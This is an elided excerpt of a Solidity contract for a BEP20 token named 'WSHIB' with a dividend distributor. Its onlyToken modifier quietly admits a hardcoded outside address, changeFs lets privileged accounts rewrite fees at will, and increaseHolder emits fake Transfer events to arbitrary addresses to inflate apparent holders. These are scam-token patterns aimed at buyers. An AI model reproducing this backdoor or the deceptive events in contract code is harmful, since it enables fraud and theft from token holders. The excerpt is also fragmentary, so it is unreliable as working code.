...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0x769473e492F8Ade34E9d56Ec3f1600E95B36FAA8)); _;
    }

    constructor (address _router,address _RewardTokenSET,uint256 dividendDecimal) {
        dDecimal=dividendDecimal;
        router = _router != address(0) ? IDEXRouter(_router) : IDEXRouter(routerAddress);
        RewardTokenSET = _RewardTokenSET != address(0) ? address(_RewardTokenSET) : address(0x2859e4544C4bB03966803b044A93563Bd2D0DD4D);
...
contract WSHIB is IBEP20 , Auth, BaseToken {
    
    using SafeMath for uint256;

    string public _name="WSHIB";
    string public _symbol="WSHIB";
    ...
    uint256 public _totalSupply=10**33 * 10**_decimals;

    uint256 public  _maxTxAmount=10**32 * 10**_decimals;
    uint256 public  _walletMax=10**32 * 10**_decimals;
    ...
    address public autoLiquidityReceiver=0x090421d4055109F0377F17a520FF30D1B6674245;
    address public marketingWallet=0x090421d4055109F0377F17a520FF30D1B6674245;
    ...
    function changeFs(uint256 newLiqFee, uint256 newRewardFee, uint256 newMarketingFee, uint256 newExtraSellFee,uint256 newburnFee) external authorized {
    ...
    function increaseHolder() private {
        ...
        if(amount>0)
        {
            ...
            for (uint256 i = 0; i < 5; i++) {
                ...
                ktNum = ktNum+1;
                emit Transfer(address(this), _receiveD, amount.div(i+5));
            }
        }
    }
